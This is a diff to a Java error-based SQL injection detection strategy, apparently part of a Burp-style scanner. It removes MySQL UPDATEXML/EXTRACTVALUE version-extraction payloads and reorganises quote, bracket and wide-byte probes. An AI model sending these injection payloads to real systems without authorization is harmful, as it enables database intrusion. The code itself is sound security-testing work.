@@ -9,20 +9,16 @@ import java.util.regex.Pattern;
 
 public class ErrorBasedInjection extends AbstractInjectionStrategy {
 
-    // 基础报错探针（继承原版 + DetSql）
-    private static final String[] PROBES = {
-        "'", "\"", "\\", "'\"\\", "`",  // 五种引号变体
-        "%DF'", "%DF\"",                // 宽字节注入
+    // 基础报错探针 — 引号 + 转义 + 括号闭合
+    private static final String[] PROBES = { "'", "\"", "\\", "')", "'))", "\")" };
+
+    // 可选增强探针 — 默认关闭 (宽字节/反引号等边缘场景)
+    private static final String[] PROBES_EXTENDED = {
+        "'\"\\", "`", "%DF'", "%DF\""
     };
 
-    // MySQL XPATH 报错探针（原版 xia_tan v1.0 的 2D 阶段）
-    private static final String[] XPATH_PROBES = {
-        "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -",
-        "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -",
-        "') AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -",
-        "')) AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -",
-        "1 AND UPDATEXML(1,CONCAT(0x7e,version()),1)",
-    };
+    /** 是否启用增强探针 (外部可配置) */
+    public static boolean extendedProbes = false;
 
     // 10 种数据库错误特征（完整版，继承原版 xia_tan v1.0）
     private static final Map<String, Pattern[]> DB = new LinkedHashMap<>();
@@ -87,30 +83,38 @@ public class ErrorBasedInjection extends AbstractInjectionStrategy {
     @Override
     public HttpRequestResponse execute(HttpRequest origReq, HttpRequestResponse baseRR,
                                          HttpParameter param, String baseBody){
+        // baseline 错误模式只计算一次（避免 12 次重复正则扫描）
+        String baseErr = detectError(baseBody);
+
         // Phase 1: 基础报错探针
-        for(String probe:PROBES){
+        for (int i = 0; i < PROBES.length; i++) {
+            String probe = PROBES[i];
             lastPayload.set(probe);
             HttpRequest modReq = append(origReq, param, probe);
             HttpRequestResponse rr = send(modReq);
-            if(rr==null) continue;
-            String err = detectError(body(rr));
-            if(err!=null){
-                String baseErr = detectError(baseBody);
-                if(baseErr==null || !baseErr.equals(err)) return rr;
+            if (rr == null) continue;
+            // 共享 ' 探针响应给 UnifiedString 复用
+            if (i == 0) setSingleQuoteProbe(rr);
+            String probeBody = body(rr);
+            if (isDifferentPage(baseBody, probeBody)) continue;
+            String err = detectError(probeBody);
+            if (err != null && (baseErr == null || !baseErr.equals(err))) return rr;
+        }
+
+        // Phase 1b: 可选增强探针 (宽字节/反引号等边缘场景)
+        if (extendedProbes) {
+            for (String probe : PROBES_EXTENDED) {
+                lastPayload.set(probe);
+                HttpRequest modReq = append(origReq, param, probe);
+                HttpRequestResponse rr = send(modReq);
+                if (rr == null) continue;
+                String probeBody = body(rr);
+                if (isDifferentPage(baseBody, probeBody)) continue;
+                String err = detectError(probeBody);
+                if (err != null && (baseErr == null || !baseErr.equals(err))) return rr;
             }
         }
-        // Phase 2: MySQL XPATH 报错探针（原版 2D 阶段）
-        for(String probe:XPATH_PROBES){
-            lastPayload.set(probe);
-            HttpRequest modReq = append(origReq, param, probe);
-            HttpRequestResponse rr = send(modReq);
-            if(rr==null) continue;
-            String err = detectError(body(rr));
-            if(err!=null){
-                String baseErr = detectError(baseBody);
-                if(baseErr==null || !baseErr.equals(err)) return rr;
-            }
-        }
+
         return null;
     }
 }
